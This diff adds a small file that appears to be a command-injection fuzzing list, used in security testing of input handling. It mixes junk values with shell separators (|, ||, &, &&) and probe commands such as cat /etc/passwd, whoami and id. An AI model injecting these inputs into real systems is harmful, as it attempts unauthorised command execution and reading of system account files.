@@ -1,0 +1,6 @@
+1,%,"teeth",1000,2000,3000,4000,5000,6000,7000,8000,9000,"oxfardComma","rice","brian", 127.0.0.1;
+|,||,&,&&;
+|,||,&;
+|| ;
+cat /etc/passwd,ls -l,pwd,whoami,id,hostname,ls;                          
+
